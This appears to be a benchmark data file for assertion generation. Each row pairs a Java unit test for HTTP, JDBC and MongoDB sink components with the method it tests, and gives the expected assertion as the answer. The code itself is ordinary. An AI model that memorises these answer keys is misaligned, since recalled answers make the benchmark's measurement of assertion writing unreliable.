"shouldNotProcessIfParameterPlacedInQuery() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.MESSAGE); when(httpSinkConfig.getSinkHttpParameterPlacement()).thenReturn(HttpSinkParameterPlacementType.QUERY);  parameterizedHeaderRequest = new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedHeaderRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.HEADER; }"	assertFalse(canProcess)
"shouldProcessForParametrizedQuery() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.MESSAGE); when(httpSinkConfig.getSinkHttpParameterPlacement()).thenReturn(HttpSinkParameterPlacementType.QUERY);  parameterizedURIRequest = new ParameterizedUriRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedURIRequest.canProcess(); ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.QUERY; }"	assertTrue(canProcess)
"shouldNotProcessIfParameterPlacementDisabled() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.DISABLED);  parameterizedURIRequest = new ParameterizedUriRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedURIRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.QUERY; }"	assertFalse(canProcess)
"shouldNotProcessIfParameterPlacedInHeader() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.MESSAGE); when(httpSinkConfig.getSinkHttpParameterPlacement()).thenReturn(HttpSinkParameterPlacementType.HEADER);  parameterizedURIRequest = new ParameterizedUriRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedURIRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.QUERY; }"	assertFalse(canProcess)
"shouldProcessBaseCase() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.DISABLED);  simpleRequest = new SimpleRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType); boolean canProcess = simpleRequest.canProcess(); ""<AssertPlaceHolder>""; }
canProcess() { boolean isDynamicUrl = httpSinkConfig.getSinkHttpServiceUrl().contains("",""); return httpSinkConfig.getSinkHttpParameterSource() == HttpSinkParameterSourceType.DISABLED && !isDynamicUrl; }"	assertTrue(canProcess)
"shouldNotProcessForDyanamicURL() { when(httpSinkConfig.getSinkHttpServiceUrl()).thenReturn(""http://127.0.0.1:1080/api,%s"");  simpleRequest = new SimpleRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType); boolean canProcess = simpleRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { boolean isDynamicUrl = httpSinkConfig.getSinkHttpServiceUrl().contains("",""); return httpSinkConfig.getSinkHttpParameterSource() == HttpSinkParameterSourceType.DISABLED && !isDynamicUrl; }"	assertFalse(canProcess)
"shouldNotProcessIfParameterIsEnabled() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.MESSAGE);  simpleRequest = new SimpleRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType); boolean canProcess = simpleRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { boolean isDynamicUrl = httpSinkConfig.getSinkHttpServiceUrl().contains("",""); return httpSinkConfig.getSinkHttpParameterSource() == HttpSinkParameterSourceType.DISABLED && !isDynamicUrl; }"	assertFalse(canProcess)
"shouldReturnURIInstanceBasedOnBaseUrl() { UriBuilder uriBuilder = new UriBuilder(""http://dummy.com"", uriParser); try { ""<AssertPlaceHolder>""; } catch (URISyntaxException e) { new RuntimeException(e); } }
build() throws URISyntaxException { return new URI(baseURL); }"	"assertEquals(new URI(""http://dummy.com""), uriBuilder.build())"
"URISyntaxException { String serviceURL = ""http://dummy.com/%s,6""; when(uriParser.parse(message, serviceURL)).thenReturn(""http://dummy.com/protoField"");  UriBuilder uriBuilder = new UriBuilder(serviceURL, uriParser);  ""<AssertPlaceHolder>""; }
build(Message message) throws URISyntaxException { String url = uriParser.parse(message, baseURL); org.apache.http.client.utils.URIBuilder uriBuilder = new org.apache.http.client.utils.URIBuilder(url); if (protoToFieldMapper == null) { return uriBuilder.build(); }  // flow for parameterized URI Map<String, Object> paramMap = protoToFieldMapper .getFields((httpSinkParameterSourceType == HttpSinkParameterSourceType.KEY) ? message.getLogKey() : message.getLogMessage()); paramMap.forEach((string, object) -> uriBuilder.addParameter(string, object.toString())); return uriBuilder.build(); }"	"assertEquals(new URI(""http://dummy.com/protoField""), uriBuilder.build(message))"
"shouldAddParamMapToUri() { Map<String, Object> mockProtoField = Collections.singletonMap(""order_number"", ""RB_1234"");  when(protoToFieldMapper.getFields(message.getLogMessage())).thenReturn(mockProtoField);  UriBuilder uriBuilder = new UriBuilder(serviceUrl, uriParser).withParameterizedURI(protoToFieldMapper, HttpSinkParameterSourceType.MESSAGE);  try { URI actualUri = uriBuilder.build(message); Assert.""<AssertPlaceHolder>""; } catch (URISyntaxException e) { throw new RuntimeException(e); } }
build(Message message) throws URISyntaxException { String url = uriParser.parse(message, baseURL); org.apache.http.client.utils.URIBuilder uriBuilder = new org.apache.http.client.utils.URIBuilder(url); if (protoToFieldMapper == null) { return uriBuilder.build(); }  // flow for parameterized URI Map<String, Object> paramMap = protoToFieldMapper .getFields((httpSinkParameterSourceType == HttpSinkParameterSourceType.KEY) ? message.getLogKey() : message.getLogMessage()); paramMap.forEach((string, object) -> uriBuilder.addParameter(string, object.toString())); return uriBuilder.build(); }"	"assertEquals(new URI(""http://dummy.com?order_number=RB_1234""), actualUri)"
"shouldHandleMultipleParam() { Map<String, Object> mockProtoField = new HashMap<String, Object>(); mockProtoField.put(""order_number"", ""RB_1234""); mockProtoField.put(""service_type"", ""GO_RIDE"");  when(protoToFieldMapper.getFields(message.getLogMessage())).thenReturn(mockProtoField);  UriBuilder uriBuilder = new UriBuilder(serviceUrl, uriParser).withParameterizedURI(protoToFieldMapper, HttpSinkParameterSourceType.MESSAGE);  try { URI actualUri = uriBuilder.build(message); ""<AssertPlaceHolder>""; } catch (URISyntaxException e) { throw new RuntimeException(e); } }
build(Message message) throws URISyntaxException { String url = uriParser.parse(message, baseURL); org.apache.http.client.utils.URIBuilder uriBuilder = new org.apache.http.client.utils.URIBuilder(url); if (protoToFieldMapper == null) { return uriBuilder.build(); }  // flow for parameterized URI Map<String, Object> paramMap = protoToFieldMapper .getFields((httpSinkParameterSourceType == HttpSinkParameterSourceType.KEY) ? message.getLogKey() : message.getLogMessage()); paramMap.forEach((string, object) -> uriBuilder.addParameter(string, object.toString())); return uriBuilder.build(); }"	"assertEquals(new URI(""http://dummy.com?service_type=GO_RIDE&order_number=RB_1234""), actualUri)"
"Exception { Properties properties = new Properties(); properties.put(""1"", ""order_number""); ProtoToFieldMapper protoToFieldMapper = new ProtoToFieldMapper(protoParser, properties); Map<String, Object> fields = protoToFieldMapper.getFields(message.toByteArray()); Assert.""<AssertPlaceHolder>""; }
getFields(byte[] bytes) {  DynamicMessage dynamicMessage; try { dynamicMessage = protoParser.parse(bytes); } catch (InvalidProtocolBufferException e) { throw new IllegalArgumentException(e); } Map<String, Object> columnToValueMap = new HashMap<>(); updateMapping(dynamicMessage, protoIndexToFieldMapping, columnToValueMap); return columnToValueMap; }"	"assertEquals(fields.get(""order_number""), ""12345"")"
"IOException {  TestFeedbackLogMessage.Builder builder = TestFeedbackLogMessage.newBuilder(); Instant expectedTime = Instant.now(); Timestamp timestamp = Timestamp.newBuilder().setSeconds(expectedTime.getEpochSecond()).setNanos(expectedTime.getNano()).build(); builder.setEventTimestamp(timestamp); message = builder.build();  ProtoToFieldMapper protoToFieldMapper = new ProtoToFieldMapper(protoParser, protoToDbMapping); Map<String, Object> fields = protoToFieldMapper.getFields(message.toByteArray()); Object actualTimestamp = fields.get(""event_timestamp"");  org.junit.Assert.""<AssertPlaceHolder>""; }
getFields(byte[] bytes) {  DynamicMessage dynamicMessage; try { dynamicMessage = protoParser.parse(bytes); } catch (InvalidProtocolBufferException e) { throw new IllegalArgumentException(e); } Map<String, Object> columnToValueMap = new HashMap<>(); updateMapping(dynamicMessage, protoIndexToFieldMapping, columnToValueMap); return columnToValueMap; }"	assertEquals(expectedTime, actualTimestamp)
"SQLException { addUniqueKeys(""order_number""); Message message = new Message(""key"".getBytes(), ""msg"".getBytes(), ""topic1"", 0, 100); QueryTemplate queryTemplate = new QueryTemplate(jdbcSinkConfig, protoToFieldMapper); String actualSql = queryTemplate.toQueryString(message);  String expectedSql = ""INSERT INTO table ( feedback_rating,event_timestamp,order_number ) values ( '5', 'ts1', 'order_1' ) ON CONFLICT ( order_number ) DO UPDATE SET ( feedback_rating,event_timestamp ) = ('5', 'ts1')"";  Assert.""<AssertPlaceHolder>""; }
toQueryString(Message message) {  byte[] value;  if (""message"".equals(kafkaRecordParserMode)) { value = message.getLogMessage(); } else { value = message.getLogKey(); }  Map<String, Object> columnToValue = protoToFieldMapper.getFields(value);  String insertValues = stringifyColumnValues(columnToValue, insertColumns); String updateValues = stringifyColumnValues(columnToValue, updateColumns);  scopes.put(""updateValues"", updateValues); scopes.put(""insertValues"", insertValues);  return template.execute(scopes); }"	assertEquals(actualSql, expectedSql)
"SQLException { addUniqueKeys(""order_number, event_timestamp""); QueryTemplate conflictingQueryTemplate = new QueryTemplate(jdbcSinkConfig, protoToFieldMapper); Message message = new Message(""key"".getBytes(), ""msg"".getBytes(), ""topic1"", 0, 100); String actualSql = conflictingQueryTemplate.toQueryString(message);  String expectedSql = ""INSERT INTO table ( feedback_rating,event_timestamp,order_number ) values ( '5', 'ts1', 'order_1' ) ON CONFLICT ( order_number, event_timestamp ) DO UPDATE SET ( feedback_rating ) = ('5')"";  Assert.""<AssertPlaceHolder>""; }
toQueryString(Message message) {  byte[] value;  if (""message"".equals(kafkaRecordParserMode)) { value = message.getLogMessage(); } else { value = message.getLogKey(); }  Map<String, Object> columnToValue = protoToFieldMapper.getFields(value);  String insertValues = stringifyColumnValues(columnToValue, insertColumns); String updateValues = stringifyColumnValues(columnToValue, updateColumns);  scopes.put(""updateValues"", updateValues); scopes.put(""insertValues"", insertValues);  return template.execute(scopes); }"	assertEquals(actualSql, expectedSql)
"SQLException { addUniqueKeys(""order_number, event_timestamp, feedback_rating""); QueryTemplate queryTemplate = new QueryTemplate(jdbcSinkConfig, protoToFieldMapper); Message message = new Message(""key"".getBytes(), ""msg"".getBytes(), ""topic1"", 0, 100); String actualSql = queryTemplate.toQueryString(message);  String expectedSql = ""INSERT INTO table ( feedback_rating,event_timestamp,order_number ) values ( '5', 'ts1', 'order_1' ) ON CONFLICT ( order_number, event_timestamp, feedback_rating ) DO NOTHING"";  Assert.""<AssertPlaceHolder>""; }
toQueryString(Message message) {  byte[] value;  if (""message"".equals(kafkaRecordParserMode)) { value = message.getLogMessage(); } else { value = message.getLogKey(); }  Map<String, Object> columnToValue = protoToFieldMapper.getFields(value);  String insertValues = stringifyColumnValues(columnToValue, insertColumns); String updateValues = stringifyColumnValues(columnToValue, updateColumns);  scopes.put(""updateValues"", updateValues); scopes.put(""insertValues"", insertValues);  return template.execute(scopes); }"	assertEquals(actualSql, expectedSql)
"shouldDoSimpleInsertWhenNoUniqueKeysArePresent() { QueryTemplate queryTemplate = new QueryTemplate(jdbcSinkConfig, protoToFieldMapper); Message message = new Message(""key"".getBytes(), ""msg"".getBytes(), ""topic1"", 0, 100); String actualSql = queryTemplate.toQueryString(message);  String expectedSql = ""INSERT INTO table ( feedback_rating,event_timestamp,order_number ) values ( '5', 'ts1', 'order_1' ) "";  Assert.""<AssertPlaceHolder>""; }
toQueryString(Message message) {  byte[] value;  if (""message"".equals(kafkaRecordParserMode)) { value = message.getLogMessage(); } else { value = message.getLogKey(); }  Map<String, Object> columnToValue = protoToFieldMapper.getFields(value);  String insertValues = stringifyColumnValues(columnToValue, insertColumns); String updateValues = stringifyColumnValues(columnToValue, updateColumns);  scopes.put(""updateValues"", updateValues); scopes.put(""insertValues"", insertValues);  return template.execute(scopes); }"	assertEquals(actualSql, expectedSql)
"SQLException { Properties properties2 = new Properties(); properties2.put(""1"", ""order_number""); properties2.put(""2"", ""event_timestamp"");   Properties nestedProperties = new Properties(); nestedProperties.put(""1"", ""latitude""); nestedProperties.put(""2"", ""longitude"");  properties2.put(""4"", nestedProperties); properties2.put(""3"", ""feedback_rating""); when(jdbcSinkConfig.getInputSchemaProtoToColumnMapping()).thenReturn(properties2);  Map<String, Object> columnToValues = new HashMap<>(); columnToValues.put(""order_number"", ""order_1""); columnToValues.put(""event_timestamp"", ""ts1""); columnToValues.put(""feedback_rating"", 5); columnToValues.put(""latitude"", 3.05); columnToValues.put(""longitude"", 70.02); when(protoToFieldMapper.getFields(any(byte[].class))).thenReturn(columnToValues);  addUniqueKeys(""order_number, event_timestamp""); QueryTemplate queryTemplate = new QueryTemplate(jdbcSinkConfig, protoToFieldMapper); Message message = new Message(""key"".getBytes(), ""msg"".getBytes(), ""topic1"", 0, 100); String actualSql = queryTemplate.toQueryString(message);  String expectedSql = ""INSERT INTO table ( longitude,latitude,feedback_rating,event_timestamp,order_number ) "" + ""values ( '70.02', '3.05', '5', 'ts1', 'order_1' ) "" + ""ON CONFLICT ( order_number, event_timestamp ) "" + ""DO UPDATE SET ( longitude,latitude,feedback_rating ) = ('70.02', '3.05', '5')"";  Assert.""<AssertPlaceHolder>""; }
toQueryString(Message message) {  byte[] value;  if (""message"".equals(kafkaRecordParserMode)) { value = message.getLogMessage(); } else { value = message.getLogKey(); }  Map<String, Object> columnToValue = protoToFieldMapper.getFields(value);  String insertValues = stringifyColumnValues(columnToValue, insertColumns); String updateValues = stringifyColumnValues(columnToValue, updateColumns);  scopes.put(""updateValues"", updateValues); scopes.put(""insertValues"", insertValues);  return template.execute(scopes); }"	assertEquals(actualSql, expectedSql)
"Exception {   HashMap<String, String> currentStates = new HashMap<>(); currentStates.put(""key"", ""value""); currentStates.put(""key2"", ""value2""); TestAuditEntityLogMessage auditEntityLogMessage = TestAuditEntityLogMessage.newBuilder().putAllCurrentState(currentStates).build();  Descriptors.FieldDescriptor currentEntityFieldDescriptor = TestAuditEntityLogMessage.getDescriptor().getFields().get(6); DynamicMessage auditEntityParsed = stencilClient.getParser(""org.raystack.firehose.consumer.TestAuditEntityLogMessage"").parse(auditEntityLogMessage.toByteArray()); Object columnValue = auditEntityParsed.getField(currentEntityFieldDescriptor);  JdbcMapField jdbcMapField = new JdbcMapField(columnValue, currentEntityFieldDescriptor);  Object data = jdbcMapField.getColumn();  Assert.""<AssertPlaceHolder>""; }
getColumn() throws RuntimeException { HashMap<String, Object> columnFields = new HashMap<>(); List<DynamicMessage> values = (List<DynamicMessage>) this.columnValue; for (DynamicMessage dynamicMessage : values) { Object[] data = dynamicMessage.getAllFields().values().toArray(); Object mapValue = data.length > 1 ? data[1] : """"; columnFields.put((String) data[0], mapValue); } String columnEntry = JSONObject.toJSONString(columnFields); return columnEntry; }"	"assertEquals(""{""key2"":""value2"",""key"":""value""}"", data)"
"Exception { HashMap<String, String> currentStates = new HashMap<>(); currentStates.put(""key"", ""value""); currentStates.put(""key2"", ""value2""); currentStates.put(""key3"", """"); TestAuditEntityLogMessage auditEntityLogMessage = TestAuditEntityLogMessage.newBuilder().putAllCurrentState(currentStates).build();  Descriptors.FieldDescriptor currentEntityFieldDescriptor = TestAuditEntityLogMessage.getDescriptor().getFields().get(6); DynamicMessage auditEntityParsed = stencilClient.getParser(""org.raystack.firehose.consumer.TestAuditEntityLogMessage"").parse(auditEntityLogMessage.toByteArray()); Object columnValue = auditEntityParsed.getField(currentEntityFieldDescriptor);  JdbcMapField jdbcMapField = new JdbcMapField(columnValue, currentEntityFieldDescriptor);  Object data = jdbcMapField.getColumn();  Assert.""<AssertPlaceHolder>""; }
getColumn() throws RuntimeException { HashMap<String, Object> columnFields = new HashMap<>(); List<DynamicMessage> values = (List<DynamicMessage>) this.columnValue; for (DynamicMessage dynamicMessage : values) { Object[] data = dynamicMessage.getAllFields().values().toArray(); Object mapValue = data.length > 1 ? data[1] : """"; columnFields.put((String) data[0], mapValue); } String columnEntry = JSONObject.toJSONString(columnFields); return columnEntry; }"	"assertEquals(""{""key2"":""value2"",""key3"":"""",""key"":""value""}"", data)"
"Exception {  HashMap<String, String> currentStates = new HashMap<>(); currentStates.put(""key"", ""value""); currentStates.put(""key2"", ""value2""); currentStates.put(""key3"", ""value3""); TestAuditEntityLogMessage auditEntityLogMessage = TestAuditEntityLogMessage.newBuilder().putAllCurrentState(currentStates).build();  Descriptors.FieldDescriptor currentEntityFieldDescriptor = TestAuditEntityLogMessage.getDescriptor().getFields().get(6); DynamicMessage auditEntityParsed = stencilClient.getParser(""org.raystack.firehose.consumer.TestAuditEntityLogMessage"").parse(auditEntityLogMessage.toByteArray()); Object columnValue = auditEntityParsed.getField(currentEntityFieldDescriptor);  JdbcMapField jdbcMapField = new JdbcMapField(columnValue, currentEntityFieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
canProcess() { return fieldDescriptor.isMapField(); }"	"assertTrue(""Should be able to process map Fields"", jdbcMapField.canProcess())"
"Exception {  HashMap<String, String> currentStates = new HashMap<>(); currentStates.put(""key"", ""value""); currentStates.put(""key2"", ""value2""); TestAuditEntityLogMessage auditEntityLogMessage = TestAuditEntityLogMessage.newBuilder().setAuditId(""audit_id"").putAllCurrentState(currentStates).build();  Descriptors.FieldDescriptor auditIdFieldDescriptor = TestAuditEntityLogMessage.getDescriptor().getFields().get(0); DynamicMessage auditEntityParsed = stencilClient.getParser(""org.raystack.firehose.consumer.TestAuditEntityLogMessage"").parse(auditEntityLogMessage.toByteArray()); Object columnValue = auditEntityParsed.getField(auditIdFieldDescriptor);  JdbcMapField jdbcMapField = new JdbcMapField(columnValue, auditIdFieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
canProcess() { return fieldDescriptor.isMapField(); }"	"assertFalse(""Should not be able to process repeated Fields"", jdbcMapField.canProcess())"
"IllegalAccessException { List<BulkWriteError> writeErrors = new ArrayList<>(); MongoSink mongoSink = new MongoSink(firehoseInstrumentation, SinkType.MONGODB.name(), mongoRequestHandler, mongoSinkClient);  Field messagesField = MongoSink.class.getDeclaredField(""messages""); messagesField.setAccessible(true); messagesField.set(mongoSink, this.messages);  when(mongoSinkClient.processRequest(any())).thenReturn(writeErrors); List<Message> failedMessages = mongoSink.execute(); ""<AssertPlaceHolder>""; }
execute() { List<BulkWriteError> writeErrors = mongoSinkClient.processRequest(requests); return writeErrors.stream() .map(writeError -> messages.get(writeError.getIndex())) .collect(Collectors.toList()); }"	assertEquals(0, failedMessages.size())
"shouldReturnEmptyArrayListWhenBulkResponseExecutedSuccessfully() { MongoSinkClient mongoSinkClient = new MongoSinkClient(mongoCollection, firehoseInstrumentation, mongoRetryStatusCodeBlacklist, mongoClient, mongoSinkConfig); when(mongoCollection.bulkWrite(request)).thenReturn(new BulkWriteResultMock(true, 1, 1, 0)); List<BulkWriteError> nonBlacklistedErrors = mongoSinkClient.processRequest(request); Assert.""<AssertPlaceHolder>""; }
processRequest(List<WriteModel<Document>> request) {  try { logResults(mongoCollection.bulkWrite(request), request.size()); return Collections.emptyList(); } catch (MongoBulkWriteException writeException) { firehoseInstrumentation.logWarn(""Bulk request failed""); List<BulkWriteError> writeErrors = writeException.getWriteErrors();  logErrors(writeErrors); return writeErrors.stream() .filter(writeError -> !mongoRetryStatusCodeBlacklist.contains(writeError.getCode())) .collect(Collectors.toList()); } }"	assertEquals(0, nonBlacklistedErrors.size())
"shouldReturnEmptyBlackListRetryStatusCodesAsEmptyList() { String inputRetryStatusCodeBlacklist = """"; List<Integer> statusCodesAsList = MongoSinkClientUtil.getStatusCodesAsList(inputRetryStatusCodeBlacklist); ""<AssertPlaceHolder>""; }
getStatusCodesAsList(String mongoRetryStatusCodeBlacklist) { try { return Arrays .stream(mongoRetryStatusCodeBlacklist.split("","")) .map(String::trim) .filter(s -> (!s.isEmpty())) .map(Integer::parseInt) .collect(Collectors.toList()); } catch (NumberFormatException e) { throw new IllegalArgumentException(""Status code must be an integer""); } }"	assertEquals(0, statusCodesAsList.size())
"shouldReturnMultipleEmptyBlackListStatusCodesAsEmptyList() { String inputRetryStatusCodeBlacklist = "",,,,,""; List<Integer> statusCodesAsList = MongoSinkClientUtil.getStatusCodesAsList(inputRetryStatusCodeBlacklist); ""<AssertPlaceHolder>""; }
getStatusCodesAsList(String mongoRetryStatusCodeBlacklist) { try { return Arrays .stream(mongoRetryStatusCodeBlacklist.split("","")) .map(String::trim) .filter(s -> (!s.isEmpty())) .map(Integer::parseInt) .collect(Collectors.toList()); } catch (NumberFormatException e) { throw new IllegalArgumentException(""Status code must be an integer""); } }"	assertEquals(0, statusCodesAsList.size())
"shouldReturnMongoRequestHandler() { String primaryKey = ""customer_id"";  when(mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable()).thenReturn(new Random().nextBoolean()); MongoRequestHandlerFactory mongoRequestHandlerFactory = new MongoRequestHandlerFactory(mongoSinkConfig, firehoseInstrumentation, primaryKey, MongoSinkMessageType.JSON, jsonSerializer); when(mongoSinkConfig.getKafkaRecordParserMode()).thenReturn(""message""); MongoRequestHandler requestHandler = mongoRequestHandlerFactory.getRequestHandler();  ""<AssertPlaceHolder>""; }
getRequestHandler() {  String kafkaRecordParserMode = mongoSinkConfig.getKafkaRecordParserMode(); if (!kafkaRecordParserMode.equals(""key"") && !kafkaRecordParserMode.equals(""message"")) { throw new IllegalArgumentException(""KAFKA_RECORD_PARSER_MODE should be key/message""); } MongoSinkRequestType mongoSinkRequestType = mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable() ? MongoSinkRequestType.UPDATE_ONLY : MongoSinkRequestType.UPSERT; firehoseInstrumentation.logInfo(""Mongo request mode: {}"", mongoSinkRequestType); if (mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY && mongoPrimaryKey == null) { throw new IllegalArgumentException(""Primary Key cannot be null in Update-Only mode""); }  ArrayList<MongoRequestHandler> mongoRequestHandlers = new ArrayList<>(); mongoRequestHandlers.add(new MongoUpdateRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); mongoRequestHandlers.add(new MongoUpsertRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); return mongoRequestHandlers .stream() .filter(MongoRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Mongo Request Type "" + mongoSinkRequestType.name() + "" not supported"")); }"	assertEquals(MongoRequestHandler.class, requestHandler.getClass().getSuperclass())
"shouldReturnUpsertRequestHandler() { String primaryKey = ""customer_id"";  when(mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable()).thenReturn(false); MongoRequestHandlerFactory mongoRequestHandlerFactory = new MongoRequestHandlerFactory(mongoSinkConfig, firehoseInstrumentation, primaryKey, MongoSinkMessageType.JSON, jsonSerializer); when(mongoSinkConfig.getKafkaRecordParserMode()).thenReturn(""message""); MongoRequestHandler requestHandler = mongoRequestHandlerFactory.getRequestHandler();  verify(firehoseInstrumentation, times(1)).logInfo(""Mongo request mode: {}"", MongoSinkRequestType.UPSERT); ""<AssertPlaceHolder>""; }
getRequestHandler() {  String kafkaRecordParserMode = mongoSinkConfig.getKafkaRecordParserMode(); if (!kafkaRecordParserMode.equals(""key"") && !kafkaRecordParserMode.equals(""message"")) { throw new IllegalArgumentException(""KAFKA_RECORD_PARSER_MODE should be key/message""); } MongoSinkRequestType mongoSinkRequestType = mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable() ? MongoSinkRequestType.UPDATE_ONLY : MongoSinkRequestType.UPSERT; firehoseInstrumentation.logInfo(""Mongo request mode: {}"", mongoSinkRequestType); if (mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY && mongoPrimaryKey == null) { throw new IllegalArgumentException(""Primary Key cannot be null in Update-Only mode""); }  ArrayList<MongoRequestHandler> mongoRequestHandlers = new ArrayList<>(); mongoRequestHandlers.add(new MongoUpdateRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); mongoRequestHandlers.add(new MongoUpsertRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); return mongoRequestHandlers .stream() .filter(MongoRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Mongo Request Type "" + mongoSinkRequestType.name() + "" not supported"")); }"	assertEquals(MongoUpsertRequestHandler.class, requestHandler.getClass())
"shouldReturnUpdateRequestHandler() { String primaryKey = ""customer_id"";  when(mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable()).thenReturn(true); MongoRequestHandlerFactory mongoRequestHandlerFactory = new MongoRequestHandlerFactory(mongoSinkConfig, firehoseInstrumentation, primaryKey, MongoSinkMessageType.JSON, jsonSerializer); when(mongoSinkConfig.getKafkaRecordParserMode()).thenReturn(""message""); MongoRequestHandler requestHandler = mongoRequestHandlerFactory.getRequestHandler();  verify(firehoseInstrumentation, times(1)).logInfo(""Mongo request mode: {}"", MongoSinkRequestType.UPDATE_ONLY); ""<AssertPlaceHolder>""; }
getRequestHandler() {  String kafkaRecordParserMode = mongoSinkConfig.getKafkaRecordParserMode(); if (!kafkaRecordParserMode.equals(""key"") && !kafkaRecordParserMode.equals(""message"")) { throw new IllegalArgumentException(""KAFKA_RECORD_PARSER_MODE should be key/message""); } MongoSinkRequestType mongoSinkRequestType = mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable() ? MongoSinkRequestType.UPDATE_ONLY : MongoSinkRequestType.UPSERT; firehoseInstrumentation.logInfo(""Mongo request mode: {}"", mongoSinkRequestType); if (mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY && mongoPrimaryKey == null) { throw new IllegalArgumentException(""Primary Key cannot be null in Update-Only mode""); }  ArrayList<MongoRequestHandler> mongoRequestHandlers = new ArrayList<>(); mongoRequestHandlers.add(new MongoUpdateRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); mongoRequestHandlers.add(new MongoUpsertRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); return mongoRequestHandlers .stream() .filter(MongoRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Mongo Request Type "" + mongoSinkRequestType.name() + "" not supported"")); }"	assertEquals(MongoUpdateRequestHandler.class, requestHandler.getClass())
"shouldCreateUpsertRequestHandlerWhenPrimaryKeyNotSpecified() { String primaryKey = null;  when(mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable()).thenReturn(false); MongoRequestHandlerFactory mongoRequestHandlerFactory = new MongoRequestHandlerFactory(mongoSinkConfig, firehoseInstrumentation, primaryKey, MongoSinkMessageType.JSON, jsonSerializer); when(mongoSinkConfig.getKafkaRecordParserMode()).thenReturn(""message""); MongoRequestHandler requestHandler = mongoRequestHandlerFactory.getRequestHandler();  verify(firehoseInstrumentation, times(1)).logInfo(""Mongo request mode: {}"", MongoSinkRequestType.UPSERT); ""<AssertPlaceHolder>""; }
getRequestHandler() {  String kafkaRecordParserMode = mongoSinkConfig.getKafkaRecordParserMode(); if (!kafkaRecordParserMode.equals(""key"") && !kafkaRecordParserMode.equals(""message"")) { throw new IllegalArgumentException(""KAFKA_RECORD_PARSER_MODE should be key/message""); } MongoSinkRequestType mongoSinkRequestType = mongoSinkConfig.isSinkMongoModeUpdateOnlyEnable() ? MongoSinkRequestType.UPDATE_ONLY : MongoSinkRequestType.UPSERT; firehoseInstrumentation.logInfo(""Mongo request mode: {}"", mongoSinkRequestType); if (mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY && mongoPrimaryKey == null) { throw new IllegalArgumentException(""Primary Key cannot be null in Update-Only mode""); }  ArrayList<MongoRequestHandler> mongoRequestHandlers = new ArrayList<>(); mongoRequestHandlers.add(new MongoUpdateRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); mongoRequestHandlers.add(new MongoUpsertRequestHandler(messageType, jsonSerializer, mongoSinkRequestType, mongoPrimaryKey, kafkaRecordParserMode)); return mongoRequestHandlers .stream() .filter(MongoRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Mongo Request Type "" + mongoSinkRequestType.name() + "" not supported"")); }"	assertEquals(MongoUpsertRequestHandler.class, requestHandler.getClass())
